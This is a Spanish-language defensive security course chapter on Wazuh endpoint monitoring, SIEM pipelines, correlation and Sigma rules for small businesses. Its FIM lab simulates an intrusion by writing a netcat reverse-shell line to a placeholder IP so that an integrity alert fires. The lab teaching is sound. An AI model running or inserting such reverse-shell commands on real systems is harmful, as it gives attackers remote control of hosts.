### Escalonamiento PyME: Organización de capacidades

De igual manera que en las secciones anteriores, la estrategia de seguridad debe seguir una maduración progresiva para evitar sobrecarga operativa. Debajo se plantea un escalamiento de visibilidad en el endpoint basado en los **Grupos de Implementación (IG)** de _CIS Controls v8.1_:

| Etapa de implementación | Meta operativa | Controles a desplegar |
| :---------------------- | :------------- | :-------------------- |
| **Nivel Básico (IG1)** | Evitar amenazas comunes y asegurar protección mínima. | Desplegar y mantener **software antimalware tradicional** en todas las estaciones, con actualización automática de firmas activada, bloqueando la capacidad del usuario estándar para desactivarlo (`CIS 10.1`, `10.2`). |
| **Nivel Intermedio (IG2)** | Incorporar supervisión interna de integridad y centralización. | Administrar el antivirus centralmente (`CIS 10.6`), habilitar capacidades de **detección basada en comportamiento** en el antimalware (`CIS 10.7`), e implementar soluciones HIDS/FIM (`Wazuh`) en servidores críticos para generar alertas de alteración de configuraciones (`CIS 13.2`). |
| **Nivel Maduro (Avanzado — IG3)** | Investigar tácticas complejas y aplicar prevención activa en host. | Desplegar agentes **EDR y HIPS** para recolectar telemetría de procesos, analizar cadenas de ejecución (LotL) y aplicar políticas de aislamiento automático ante intrusiones activas (`CIS 13.7`). |

_Ruta de madurez para la visibilidad en el Endpoint, evitando la compra de tecnologías que excedan la capacidad de administración del equipo técnico._

### 5.3.1. Wazuh <!-- id: herramienta-wazuh, icon: ShieldCheckIcon, displayTitle: 05.3.1 — Wazuh, description: Plataforma unificada de seguridad para el endpoint (XDR/SIEM), monitoreo de integridad de archivos (FIM), detección de anomalías y respuesta activa. -->

Mientras que herramientas como Wireshark, Suricata o Zeek monitorean los paquetes que viajan por el cable de red, no tienen visibilidad sobre lo que sucede en la memoria, los discos o los procesos internos de cada servidor/dispositivo. Las verificaciones manuales de hashes tampoco escalan cuando una organización gestiona múltiples equipos. Para resolver este desafío, la industria utiliza plataformas de seguridad basadas en host como [**Wazuh**](https://wazuh.com).

Wazuh es una plataforma libre y de código abierto que unifica capacidades de **HIDS** (_Host-based Intrusion Detection System_), **FIM** (_File Integrity Monitoring_), **SIEM** y **XDR** (_Extended Detection and Response_). Su arquitectura modular se compone de dos piezas fundamentales:

1. **La plataforma central (_Wazuh Central Architecture_):** Compuesta por el **Wazuh Server / Manager** (motor de análisis, correlación, decodificadores y reglas), el **Wazuh Indexer** (motor de búsqueda distribuido basado en OpenSearch para almacenar eventos) y el **Wazuh Dashboard** (interfaz web unificada para visualización, triaje y mapeo contra ataques conocidos de MITRE ATT&CK).
2. **El agente ligero de Wazuh (_Wazuh Agent_):** Un _daemon_ multipropósito que se instala en los dispositivos que queremos vigilar (Linux, Windows, macOS). El agente consume una cantidad mínima de recursos (habitualmente entre 30 y 50 MB de memoria RAM y menos del 1% de CPU), ejecutando localmente múltiples módulos de telemetría sin degradar el rendimiento.

| Módulo del Agente Wazuh                                      | ¿Qué supervisa en el sistema operativo?                                                                           | Ejemplo de escenario que detecta en una PyME                                                                               |
| :----------------------------------------------------------- | :---------------------------------------------------------------------------------------------------------------- | :------------------------------------------------------------------------------------------------------------------------- |
| **Monitoreo de Integridad (`syscheck` / FIM)**               | Modificaciones, creaciones y eliminaciones de archivos y claves de registro en tiempo real.                       | _Un atacante inyecta una clave SSH no autorizada en `/root/.ssh/authorized_keys` o altera un ejecutable en `/usr/bin`._    |
| **Análisis de Registros (`logcollector`)**                   | Ingesta y normalización de eventos de autenticación, logs de sistema (`syslog`, EventLog) y servidores web.       | _Múltiples intentos fallidos de autenticación SSH por fuerza bruta seguidos de un inicio de sesión exitoso._               |
| **Detección de Vulnerabilidades (`vulnerability-detector`)** | Correlación del software instalado en el host contra bases de datos de vulnerabilidades conocidas (CVEs del NVD). | _Un servidor mantiene una versión obsoleta de Apache o OpenSSL con fallos críticos de ejecución remota de código._         |
| **Evaluación de Configuración (`sca` / `rootcheck`)**        | Verificación de hardening contra guías CIS Benchmarks, detección de puertos ocultos y malware persistente.        | _Un servicio expone contraseñas por defecto o un script malicioso intenta ocultar procesos dentro de `/proc`._             |
| **Respuesta Activa (`active-response`)**                     | Ejecución controlada y automatizada de comandos ante eventos de severidad crítica comprobada.                     | _Bloqueo temporal de una dirección IP atacante en el cortafuegos local (`nftables`/`iptables`) ante un ataque recurrente._ |

> [!TIP:Atribución de autoría con FIM: realtime vs whodata]
> El módulo de integridad de Wazuh (`syscheck`) ofrece dos mecanismos de supervisión continua:
>
> - **Modo en Tiempo Real (`realtime="yes"`):** Utiliza las llamadas `inotify` del kernel de Linux para alertar al instante sobre qué archivo cambió, en qué segundo y cuál es su nuevo hash criptográfico.
> - **Modo con Atribución (_Who-data_ — `whodata="yes"`):** Se conecta directamente al subsistema de auditoría del kernel (`auditd`) para registrar no solo qué archivo cambió, sino **qué usuario exacto (`auid`), qué comando y qué identificador de proceso (`pid` y `ppid`)** ejecutó la modificación. Esto convierte una simple alerta técnica en evidencia forense irrefutable.

#### Tutorial desde cero: Despliegue de agente y monitoreo de integridad (FIM) con Wazuh

En esta sección explicaremos cómo instalar el agente de Wazuh en un servidor Linux (Ubuntu/Debian) para entornos headless (sin pantalla ni entorno gráfico de escritorio). Configuraremos el motor FIM para auditar un directorio crítico con detección en tiempo real y cálculo de diferencias criptográficas, simularemos una intrusión adversaria y analizaremos la alerta resultante.

De todos modos, si tu entorno cuenta con interfaz gráfica no es obligatorio hacerlo todo por terminal; tanto en Linux, como en Windows y macOS es posible gestionar casi todo el proceso mediante interfaz gráfica.

- **En Windows:** Puedes descargar e instalar el archivo .msi con el asistente visual clásico, editar el archivo ossec.conf con el Bloc de notas (abierto con clic derecho como administrador) y reiniciar o comprobar el agente desde la ventana de Servicios (services.msc).
- **En macOS:** La instalación se realiza con el instalador visual .pkg de doble clic, la configuración de permisos se autoriza gráficamente desde Ajustes del Sistema → Privacidad y seguridad → Acceso total al disco, y la edición del archivo de configuración puede hacerse con cualquier editor de texto con permisos de administrador.

:::steps

### 1. Instalar el agente Wazuh en el host

En el servidor o máquina virtual que deseas supervisar (basado en Debian o Ubuntu), primero debemos agregar los repositorios oficiales de Wazuh para que el gestor de paquetes (`apt`) pueda descargar el software verificado.

```bash:terminal
# 1. Instalar dependencias necesarias para manejar repositorios HTTPS
sudo apt-get update && sudo apt-get install -y curl gnupg apt-transport-https

# 2. Descargar e importar la clave GPG oficial para validar que los paquetes no estén adulterados
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | sudo gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import && sudo chmod 644 /usr/share/keyrings/wazuh.gpg

# 3. Registrar el repositorio oficial estable en la lista de fuentes
echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | sudo tee /etc/apt/sources.list.d/wazuh.list

# 4. Actualizar índices e instalar el agente
sudo apt-get update && sudo apt-get install -y wazuh-agent
```

**¿Por qué hacemos esto?**

El agente es el programa ligero que corre en segundo plano en cada servidor. Su función es observar localmente los eventos y calcular las sumas criptográficas sin depender de conexiones remotas continuas.

Comprueba que los binarios del agente se hayan instalado en el directorio estándar `/var/ossec/`:

```bash:terminal
ls -l /var/ossec/bin/wazuh-control
```

### 2. Configurar el destino del agente (Wazuh Manager)

El agente recopila datos en el host, pero habitualmente envía sus alertas a un servidor centralizado (Wazuh Manager). Su configuración principal reside en el archivo XML `/var/ossec/etc/ossec.conf`.

Si cuentas con un servidor central en tu red (por ejemplo, en la IP `192.168.1.50`), configúralo con este comando para reemplazar la dirección comodín `0.0.0.0`:

```bash:terminal
sudo sed -i 's/<address>0.0.0.0<\/address>/<address>192.168.1.50<\/address>/' /var/ossec/etc/ossec.conf
```

Verifica que el cambio se haya aplicado en la sección `<client><server>`:

```bash:terminal
grep -A 2 "<server>" /var/ossec/etc/ossec.conf
```

Si estás realizando esta práctica en una máquina virtual aislada sin un servidor Wazuh Manager encendido, funciona exactamente igual: el motor local de integridad (`wazuh-syscheckd`) calcula las líneas base, vigila los archivos en tiempo real y escribe los eventos en los registros locales `/var/ossec/logs/alerts/alerts.log` y `/var/ossec/logs/ossec.log`.

### 3. Preparar un directorio de prueba y un archivo simulado

Para verificar que el sistema funciona sin alterar archivos reales del sistema operativo (como `/etc/passwd` o `/etc/ssh/sshd_config`), creamos una carpeta de prueba aislada:

```bash:terminal
sudo install -d -m 0750 /opt/fim-lab
```

Creamos dentro un archivo de texto con parámetros ficticios que simulará ser un archivo importante de la organización:

```bash:terminal
sudo tee /opt/fim-lab/servicios-criticos.conf >/dev/null <<'EOF'
# Configuracion del servicio de autenticacion
PORT=8443
ENABLE_AUTH=yes
MAX_RETRIES=3
MAINTENANCE_MODE=no
EOF
```

Restringimos los permisos para que pertenezca al usuario administrador y tenga permisos de lectura/escritura seguros (`0640`):

```bash:terminal
sudo chmod 0640 /opt/fim-lab/servicios-criticos.conf
```

### 4. Configurar el módulo FIM (`syscheck`) en `ossec.conf`

El motor de integridad de archivos de Wazuh se gobierna dentro de la sección `<syscheck>` del archivo `/var/ossec/etc/ossec.conf`.

Abre el archivo con tu editor preferido (por ejemplo, `sudo nano /var/ossec/etc/ossec.conf`), localiza la etiqueta `<syscheck>` y añade dentro la regla de supervisión para nuestra carpeta:

```xml:/var/ossec/etc/ossec.conf
<syscheck>
  <!-- Frecuencia de escaneo programado: cada 12 horas (43200 segundos por defecto) -->
  <frequency>43200</frequency>

  <!-- Monitoreo en tiempo real del directorio, revisando todos los atributos y reportando diferencias de contenido -->
  <directories realtime="yes" check_all="yes" report_changes="yes">/opt/fim-lab</directories>

  <!-- Buenas prácticas: no volcar diferencias si el archivo almacena claves privadas -->
  <nodiff>/opt/fim-lab/*.key</nodiff>

  <!-- Ignorar archivos temporales generados por editores de texto -->
  <ignore type="sregex">\.swp$|\.tmp$</ignore>
</syscheck>
```

**¿Qué significa cada parámetro según la documentación oficial?**

- **`realtime="yes"`:** Activa las notificaciones del kernel de Linux (subsistema _inotify_). En lugar de esperar 12 horas al próximo escaneo, Wazuh detecta la modificación en el milisegundo exacto en que ocurre. Solo puede aplicarse sobre directorios, no sobre archivos individuales.
- **`check_all="yes"`:** Le ordena a Wazuh registrar y comparar todos los atributos: hashes criptográficos (MD5, SHA-1, SHA-256), tamaño del archivo, permisos de acceso, propietario y grupo.
- **`report_changes="yes"`:** Guarda una copia privada y cifrada del archivo en el host. Cuando alguien lo edita, genera una diferencia línea por línea (_diff_) mostrando exactamente qué texto se agregó o se borró.

### 5. Reiniciar el agente e indexar la línea base inicial

Para que el motor lea las nuevas reglas y tome la "fotografía" inicial del estado legítimo de los archivos, reinicia el servicio:

```bash:terminal
sudo systemctl restart wazuh-agent
sudo systemctl status wazuh-agent --no-pager
```

Revisa el registro operativo para confirmar que el subdemonio de integridad (`wazuh-syscheckd`) haya iniciado su recorrido:

```bash:terminal
sudo grep -i "syscheck" /var/ossec/logs/ossec.log | tail -n 6
```

**¿Qué ocurrió aquí?**

Wazuh calculó los hashes SHA-256 de `/opt/fim-lab/servicios-criticos.conf` y los almacenó en su base de datos local como la **Línea Base Confiable**. A partir de este segundo, cualquier byte que cambie disparará una alerta.

### 6. Simular dos incidentes de manipulación

Para comprobar que la detección funciona, simula dos acciones maliciosas típicas:

**Escenario A: Modificación de configuración sensible**

Un intruso modifica el archivo para desactivar la autenticación obligatoria:

```bash:terminal
sudo sed -i 's/ENABLE_AUTH=yes/ENABLE_AUTH=no/' /opt/fim-lab/servicios-criticos.conf
```

**Escenario B: Creación de un script no autorizado**

El atacante deposita un script en la carpeta para intentar abrir una puerta trasera:

```bash:terminal
printf '#!/bin/bash\nnc -e /bin/bash 198.51.100.40 4444\n' | sudo tee /opt/fim-lab/backdoor.sh >/dev/null
sudo chmod +x /opt/fim-lab/backdoor.sh
```

### 7. Inspeccionar y auditar las alertas detectadas

En el instante en que ejecutaste los comandos anteriores, el motor registró los incidentes. Puedes consultarlos de dos formas según tu necesidad operativa:

**Opción 1: Lectura en texto plano (`alerts.log`)**

Ideal para inspección rápida en terminal:

```bash:terminal
sudo tail -n 25 /var/ossec/logs/alerts/alerts.log
```

Verás una alerta de severidad nivel 7 indicando que la suma de verificación cambió (_Integrity checksum changed_), detallando el hash SHA-256 anterior, el nuevo hash y la línea exacta alterada gracias a `report_changes`:

```text:alerts.log
** Alert 1729002512.10542: - ossec, syscheck, syscheck_entry_modified, syscheck_file,
2026 Nov 07 16:35:12 (srv-prod-01) 192.168.1.10->syscheck
Rule: 550 (level 7) -> 'Integrity checksum changed.'
Integrity checksum changed for: '/opt/fim-lab/servicios-criticos.conf'
Old sha256sum was: '4a7d0e4c6b8c4d2e...'
New sha256sum is : '9c1b2f8a3d5e7c1a...'
What changed:
3c3
< ENABLE_AUTH=yes
---
> ENABLE_AUTH=no
```

**Opción 2: Consulta estructurada en JSON (`alerts.json`)**

Si integras tus alertas con un panel central o analizas con herramientas de consola, puedes usar `jq` para extraer campos puntuales:

```bash:terminal
sudo tail -n 50 /var/ossec/logs/alerts/alerts.json | jq 'select(.rule.groups[]? == "syscheck") | {hora: .timestamp, regla: .rule.id, archivo: .syscheck.path, evento: .syscheck.event, sha256_antiguo: .syscheck.sha256_before, sha256_nuevo: .syscheck.sha256_after, diferencia: .syscheck.diff}'
```

Este comando filtra los eventos del módulo FIM y muestra de forma limpia qué archivo cambió, su tipo de evento (`modified` o `added`), los hashes criptográficos y el cambio exacto de contenido.
:::

| Directiva / Atributo en `<syscheck>` | ¿Qué función cumple en la configuración?                                                                 | Recomendación para PyMEs                                                                                                                                     |
| :----------------------------------- | :------------------------------------------------------------------------------------------------------- | :----------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `directories`                        | Especifica la ruta absoluta de las carpetas o archivos que deben auditarse.                              | Supervisar `/etc`, `/usr/bin`, `/usr/sbin`, `/boot` y la raíz de aplicaciones web (`/var/www`).                                                              |
| `realtime="yes"`                     | Habilita la notificación instantánea ante cambios mediante el subsistema `inotify` del kernel.           | Habilitar en directorios con archivos de configuración estables. Evitar en carpetas con millones de archivos temporales para prevenir saturación de memoria. |
| `whodata="yes"`                      | Audita qué usuario y qué proceso exacto ejecutó la modificación (requiere subsistema `auditd`).          | Recomendado para servidores de misión crítica o bases de datos con requerimientos de trazabilidad forense estricta.                                          |
| `check_all="yes"`                    | Comprueba tamaño, permisos, propietario, grupo, fecha y hashes criptográficos (MD5, SHA-1, SHA-256).     | Mantener activado por defecto para garantizar que cualquier variación física o lógica sea descubierta.                                                       |
| `report_changes="yes"`               | Almacena y envía el resumen con la diferencia exacta línea por línea (_diff_) del archivo modificado.    | Activar exclusivamente en archivos de texto legibles. **Nunca activar** en rutas que contengan contraseñas o claves privadas.                                |
| `<nodiff>`                           | Previene que el contenido o los cambios de un archivo sensible se almacenen en los registros del agente. | Aplicar sobre archivos con secretos, certificados SSL/TLS o contraseñas en claro (`/etc/shadow`, certificados `.pem`).                                       |
| `<ignore>`                           | Omite archivos o extensiones con cambios constantes y legítimos para no saturar el canal.                | Excluir archivos de estado efímero (`.swp`, `.tmp`, sockets, `/etc/mtab`, `/etc/resolv.conf`).                                                               |

> [!CRITICAL:Protección de confidencialidad con la directiva nodiff]
> La función `report_changes="yes"` es una de las capacidades más valiosas de Wazuh para entender qué alteró un atacante, pero representa un riesgo de fuga de información confidencial si se aplica sin cuidado. Si configuras `report_changes` sobre una carpeta que contiene claves privadas SSH, certificados TLS o archivos con cadenas de conexión a bases de datos, Wazuh guardará las contraseñas en texto claro dentro de sus archivos de alertas (`alerts.log` y `alerts.json`) y las enviará por la red al servidor central. Utiliza siempre la directiva `<nodiff>` para especificar qué archivos deben vigilarse únicamente por su hash, sin jamás volcar su contenido interno al registro de eventos.

#### Aplicación práctica en una PyME y recursos oficiales

En una pequeña o mediana empresa con recursos técnicos acotados, Wazuh ofrece una ventaja operativa decisiva: **unifica en un solo agente lo que tradicionalmente requería contratar tres herramientas comerciales distintas** (antivirus centralizado, auditoría de integridad FIM y recopilación de logs).

Para implementar Wazuh de forma sostenible en una PyME sin sobrecargar al equipo:

1. **Despliegue gradual y bajo consumo:** Comienza instalando el agente en los servidores más expuestos (servidores web en DMZ, servidores de acceso remoto VPN y controladores de dominio). El consumo de memoria del agente (<50 MB) permite ejecutarlo con total seguridad incluso en máquinas virtuales modestas en la nube.
2. **Coordinación con ventanas de mantenimiento:** Antes de ejecutar una actualización masiva del sistema operativo (`sudo apt update && sudo apt upgrade`), pausa temporalmente el servicio del agente o correlaciona las alertas con el horario de mantenimiento. Esto previene que el equipo reciba decenas de alertas falsas causadas por la sustitución legítima de binarios del sistema.
3. **Visibilidad multiplataforma centralizada:** Aprovecha el agente para estandarizar la supervisión de servidores Linux y estaciones Windows desde una misma consola web, aprovechando la detección de claves de registro de persistencia (`Run` y `RunOnce`) en Windows y la vigilancia de `/etc/` en Linux.

Para profundizar en la arquitectura distribuida, reglas avanzadas de correlación y configuración de respuestas activas:

- [Sitio web oficial de Wazuh](https://wazuh.com): Portal central del proyecto, casos de uso y descarga de instaladores.
- [Documentación oficial de Wazuh](https://documentation.wazuh.com): Guías paso a paso para el despliegue del Wazuh Server, configuración detallada de `syscheck` y decodificadores de logs.

## 5.4. Detección SIEM y ML <!-- id: siem-ml, icon: Bookmark01Icon, displayTitle: 05.4 — Detección con SIEM y ML, description: Cómo aplicar herramientas SIEM al flujo de seguridad y cuál es el alcance real de incorporar modelos de Aprendizaje Automático (Machine Learning) y Análisis de Comportamiento (UEBA). -->

En las secciones anteriores configuramos _logs_ locales del sistema operativo (`5.1`), sensores para observar el tráfico en tránsito por la red (`5.2`) y agentes para supervisar la integridad y los procesos dentro de cada dispositivo (`5.3`). Sin embargo, habilitar todas estas fuentes genera un nuevo desafío operativo para una pequeña o mediana empresa: la fragmentación de la evidencia. Si una organización cuenta con diez servidores, un firewall perimetral y treinta estaciones de trabajo, tendrá más de cuarenta consolas y archivos de registro separados generando miles de líneas por hora.

Intentar detectar una intrusión conectándose manualmente servidor por servidor para leer archivos de texto plano no solo es operativamente inviable, sino que presenta dos puntos ciegos críticos:

1. **Destrucción de evidencia local (_Indicator Removal_):** Si un atacante logra comprometer un servidor y escalar privilegios hasta obtener permisos administrativos (`root` o `SYSTEM`), su primer paso suele ser borrar o truncar los archivos locales en `/var/log/` o vaciar el Visor de Eventos de Windows. Si esos logs no fueron enviados en tiempo real hacia un repositorio externo y aislado, la organización pierde toda capacidad de saber qué ocurrió.

2. **Invisibilidad de los ataques distribuidos:** Una intrusión moderna rara vez ocurre en un único componente. Un atacante puede adivinar una contraseña en el portal de acceso remoto, saltar desde allí hacia un servidor de archivos y finalmente extraer información por la red. Mirando cada equipo por separado, cada evento aislado parece una operación rutinaria; solo al juntar las piezas en una misma línea de tiempo se revela la secuencia del ataque.

Para resolver este problema existe la **Gestión de Información y Eventos de Seguridad** (SIEM, por sus siglas en inglés: _Security Information and Event Management_). Podemos pensar en un SIEM como la torre de control de un aeropuerto: cada avión, radar y pista de aterrizaje tiene sus propios instrumentos locales, pero ninguno ve el panorama completo; la torre de control recibe las señales de todos en tiempo real, las traduce a un mismo mapa y alerta a los operadores cuando dos trayectorias están en curso de colisión.

Esta sección explica cómo funciona internamente la tubería de datos de un SIEM, cómo diseñar reglas de correlación deterministas para descubrir ataques complejos (como el abuso de cuentas legítimas) y cuál es el alcance real —junto con las limitaciones y riesgos— de incorporar modelos de Aprendizaje Automático (_Machine Learning_) y Análisis de Comportamiento (`UEBA`).

### El pipeline de datos de un SIEM: Del evento crudo a la alerta

Un error habitual al implementar una plataforma SIEM consiste en asumir que basta con apuntar todos los equipos hacia un servidor central para que la herramienta "detecte ataques". Internamente, cuando millones de líneas de texto llegan desde sistemas operativos y fabricantes distintos, el SIEM debe procesarlas a través de una tubería técnica (_data pipeline_) de seis etapas antes de poder evaluar cualquier amenaza.

```filetree:Arquitectura_Pipeline_SIEM
Como_viaja_un_registro_hasta_ser_alerta/
├── 01_Recoleccion/   # Traer los datos: enviar los registros desde computadoras y servidores hacia el sistema central
├── 02_Recepcion/     # Fila de espera: recibir los mensajes y guardarlos en cola para no perder datos si llegan muchos juntos
├── 03_Traduccion/    # Unificar el formato: ordenar los datos para que todos los sistemas usen los mismos nombres de campos
├── 04_Contexto/      # Agregar informacion util: sumar datos extra (como pais de origen, tipo de servidor o usuario)
├── 05_Guardado/      # Archivar: separar los datos recientes (para buscar rapido) de los antiguos (para guardar por meses)
└── 06_Deteccion/     # Revisar y alertar: comparar los eventos con reglas de seguridad para avisar si algo es sospechoso
```

Comprender qué ocurre en cada eslabón permite diagnosticar por qué una alerta no se dispara o por qué el servidor central se queda sin espacio en disco:

:::group title="Etapas del Pipeline de Datos de un SIEM"s

- **1. Recolección [Collection]**: Es el mecanismo de transporte desde la fuente hacia el servidor central. Puede realizarse **con agente** (instalando un servicio ligero como `wazuh-agent` en los servidores y estaciones para leer registros del sistema, procesos e integridad) o **sin agente (_agentless_)** mediante protocolos estándar de red como Syslog (`UDP/TCP 514` o `TCP 6514` cifrado con TLS) para dispositivos donde no se pueden instalar programas (firewalls, switches, impresoras) y mediante conectores API para servicios en la nube (Microsoft 365, Google Workspace).

- **2. Ingesta y Buffering [Ingestion & Queuing]**: El tráfico de eventos en una empresa no es constante; una actualización masiva o un ataque de fuerza bruta puede multiplicar por diez la cantidad de logs por segundo. La etapa de _buffering_ utiliza colas intermedias en memoria o disco para absorber esos picos repentinos, evitando que el procesador del SIEM se sature y descarte eventos críticos por desbordamiento.
- **3. Extracción y Normalización [Parsing & Normalization]**: Cada fabricante escribe sus registros en un idioma distinto: un firewall de red puede llamar a la dirección de origen `src_ip`, un servidor Linux la llama `rhost` en `/var/log/auth.log` y Windows la registra como `IpAddress` dentro de un bloque XML. El analizador sintáctico (_parser_ o decodificador) extrae los datos del texto crudo y los traduce a un **esquema común unificado** —como ECS (_Elastic Common Schema_) u OCSF (_Open Cybersecurity Schema Framework_)— donde el campo siempre se llamará, por ejemplo, `source.ip` sin importar de qué equipo provenga.
- **4. Enriquecimiento [Enrichment]**: Una vez que el evento está normalizado, el SIEM le agrega contexto automático que no venía en el registro original: traduce la dirección IP pública a su país y proveedor de Internet (_GeoIP_), cruza la dirección interna con el inventario del Módulo 2 para añadir la etiqueta de criticidad del servidor, o marca si el archivo coincide con una lista de indicadores maliciosos conocidos.
- **5. Indexación y Almacenamiento [Indexing & Storage]**: Para que un analista pueda buscar una dirección IP entre cincuenta millones de registros y obtener respuesta en menos de un segundo, los datos normalizados se guardan en bases de datos de índices invertidos (como OpenSearch o Elasticsearch). Por razones de costo en una PyME, el almacenamiento se divide en **datos calientes _hot storage_** en discos rápidos para búsquedas de los últimos 7 a 30 días, y **archivos fríos (_cold/archive storage_)** comprimidos y firmados para cumplir con los 90 días o más de retención histórica.
- **6. Motor de Correlación y Búsqueda [Correlation Engine]**: Es el cerebro analítico que inspecciona cada evento normalizado en tiempo real (o mediante consultas programadas) para verificar si un evento individual o una secuencia combinada de eventos cumple las condiciones para disparar una alerta de seguridad.
  :::

> [!NOTE:Enviar registros con sincronización horaria (NTP)]
> La etapa de correlación depende por completo de que todos los equipos de la empresa compartan la misma hora exacta al milisegundo (Salvaguarda `CIS 8.4`).

### Correlación determinista basada en reglas (Nivel IG2)

El primer motor analítico de todo SIEM es **determinista**: funciona mediante reglas lógicas explícitas (_SI ocurre A + Y luego ocurre B + DENTRO DE X minutos = ENTONCES disparar Alerta C_). Si la condición matemática se cumple, la alerta se genera el 100% de las veces; si no se cumple, no se genera.

#### Por qué las reglas de correlación son indispensables frente a cuentas válidas

Imaginemos el escenario de intrusión más frecuente en empresas actuales: el atacante no utiliza ningún programa malicioso extraño ni explota una vulnerabilidad técnica compleja; en su lugar, compra o roba la contraseña de un empleado y accede al entorno utilizando esa identidad legítima (técnica catalogada en MITRE ATT&CK como **`T1078: Valid Accounts`**).

Si observamos cada sistema de forma aislada, ningún control preventivo tradicional verá un ataque: el antivirus no detecta virus porque no los hay, y el firewall deja pasar el tráfico porque el usuario ingresó por el puerto autorizado. Sin embargo, una **regla de correlación en el SIEM** nos permita unir las pistas de sistemas distintos para revelar ataques completos. Veamos un ejemplo:

| Momento                     | Dónde ocurrió (Fuente)          | Qué pasó exactamente                                                                                                                  | ¿Es sospechoso por sí solo?                                                                             |
| --------------------------- | ------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------- |
| **Paso 1** _(Minuto 00:00)_ | Acceso Remoto / VPN             | El usuario `jperez` falla su contraseña 5 veces seguidas y al sexto intento inicia sesión desde un país inusual.                      | **No necesariamente:** El empleado podría estar de viaje y haberse equivocado al tipear en el teléfono. |
| **Paso 2** _(Minuto 03:20)_ | Red Interna _(Zeek / Firewall)_ | La computadora remota de `jperez` se conecta por consola administrativa (`SSH` o `RDP`) al servidor de base de datos (`10.10.30.20`). |

| **Raro, pero no concluyente:** La conexión es válida a nivel de red, aunque no coincide con las tareas habituales de su puesto.

|
| **Paso 3** _(Minuto 05:45)_ | Servidor _(Agente en el Endpoint)_ | Dentro del servidor de base de datos se crea un nuevo usuario local con permisos de administrador (`Event ID 4720` en Windows o `useradd` en Linux).

| **Grave:** Alguien está creando una cuenta secundaria para asegurarse de no perder el acceso (persistencia).

|
| _Ejemplo de correlación: tres eventos que aislados generan dudas, pero que combinados demuestran un compromiso de cuenta._ | | | |

Por separado, el paso 1 parece un simple olvido de contraseña y el paso 2 puede pasar por una tarea de soporte técnico rutinaria. Pero al conectar los tres pasos en una misma línea de tiempo, el SIEM reconoce el patrón completo: **alguien adivinó la clave de un empleado por fuerza bruta, entró a la red y creó un usuario de respaldo**. La regla une los puntos y genera una alerta crítica de inmediato.

#### Estándares abiertos de reglas portables: Introducción a Sigma

Históricamente, cada fabricante de SIEM obligaba a los analistas a escribir las reglas de correlación en su propio lenguaje cerrado y propietario (por ejemplo, `SPL` en Splunk, `KQL` en Microsoft Sentinel o el formato XML propio de Wazuh). Si una organización decidía cambiar de herramienta o quería compartir una regla de detección con otra empresa, debía reescribir todo desde cero.

Para solucionar esto nació **Sigma**: un estándar abierto y universal basado en archivos de texto `YAML` sencillos que funciona para los registros del SIEM exactamente igual a como funcionan las reglas de Suricata/Snort para el tráfico de red. Una regla escrita en formato Sigma describe de manera genérica qué campos y valores buscar, y luego puede traducirse automáticamente a cualquier plataforma SIEM del mercado.

Para entender qué es Sigma, ayuda pensar en un ejemplo de ataque común: cuando un atacante intenta crear un usuario con privilegios de administrador en secreto para no perder acceso al equipo (persistencia). En lugar de aprender la sintaxis cerrada de cada fabricante de SIEM, una regla Sigma permite describir esa condición en un archivo de texto estándar (`YAML`) que cualquiera puede entender:

```yaml:sigma_creacion_usuario_local.yml
title: Creacion de Cuenta de Usuario Local en Windows
id: a7d2e411-9f2b-4d89-91a0-56b2c8e31a10
status: stable
description: Detecta la creacion de un nuevo usuario local en el equipo, tecnica habitual para mantener acceso persistente tras una intrusion.
references:
    - https://attack.mitre.org/techniques/T1136/001/
author: Lilium
date: 2026/05/19
tags:
    - attack.persistence
    - attack.t1136.001
logsource:
    product: windows
    service: security
detection:
    selection:
        # El Event ID 4720 se genera en Windows cada vez que se crea una cuenta de usuario
        EventID: 4720
    condition: selection
falsepositives:
    - Altas legitimas de empleados realizadas por el area de soporte o recursos humanos
level: medium
```

#### ¿Cómo se lee esta regla en 4 pasos?

1. **Contexto general (`title` y `description`):** Explica en lenguaje humano qué estamos buscando (la creación de una cuenta de usuario).
2. **Origen de los datos (`logsource`):** Indica qué sistema genera el registro. En este caso, el canal de seguridad de un sistema operativo Windows (`product: windows`, `service: security`).
3. **Condición de detección (`detection`):** Es el corazón de la regla. Solo le pide al sistema vigilar un campo concreto: si el evento que entra tiene el identificador `EventID: 4720`, la condición se cumple.
4. **Criterio de alerta (`level` y `falsepositives`):** Define qué tan urgente es (`medium`) y advierte que un alta de personal autorizada también generará este evento, ayudando al analista a no confundir una tarea de oficina con un incidente.

La ventaja de Sigma es que un mismo archivo se puede convertir con una sola herramienta: `sigmac, a una consulta para Splunk, una regla para Wazuh o una búsqueda para Microsoft Sentinel, sin tener que reescribir la lógica desde cero.

### Aprendizaje Automático (Machine Learning) y UEBA como capa complementaria

Las reglas de correlación deterministas como la que acabamos de ver son la columna vertebral de cualquier centro de monitoreo, pero tienen un límite estructural: **requieren que el defensor imagine de antemano el umbral exacto del ataque**.

Por ejemplo, si se escribe una regla determinista que diga _"Disparar alerta si un usuario falla su contraseña 10 veces en 1 minuto"_, un atacante paciente que programe su herramienta para probar solo 2 contraseñas cada 15 minutos jamás disparará la regla. Del mismo modo, si un empleado descontento que ya tiene permisos legítimos sobre la carpeta de clientes decide copiar 50.000 archivos un domingo a las 03:00 AM antes de renunciar, ninguna regla de contraseñas fallidas ni ningún antivirus se dará por enterado.

Para cubrir estas zonas grises donde no existen firmas estáticas ni umbrales fijos evidentes, la industria incorpora modelos estadísticos de **Aprendizaje Automático (_Machine Learning_ o ML)** aplicados al **Análisis del Comportamiento de Usuarios y Entidades** (UEBA, por sus siglas en inglés: _User and Entity Behavior Analytics_).

#### ¿Cómo funcionan el Machine Learning y UEBA en la práctica real?

Un motor de Machine Learning aplicado a la detección de seguridad es un sistema matemático estadístico que responde a una única pregunta: **¿Qué tan diferente es lo que está ocurriendo hoy en comparación con lo que este mismo usuario o servidor hizo durante los últimos 30 o 60 días?**

En lugar de evaluar reglas fijas de "permitido o prohibido", un módulo UEBA (disponible hoy tanto en plataformas SIEM/EDR comerciales como Microsoft Sentinel o Splunk, así como en suites abiertas como Elastic Security o mediante integraciones estadísticas en Wazuh/OpenSearch) construye un **perfil de línea base histórica (_baseline_)** combinando cuatro dimensiones:

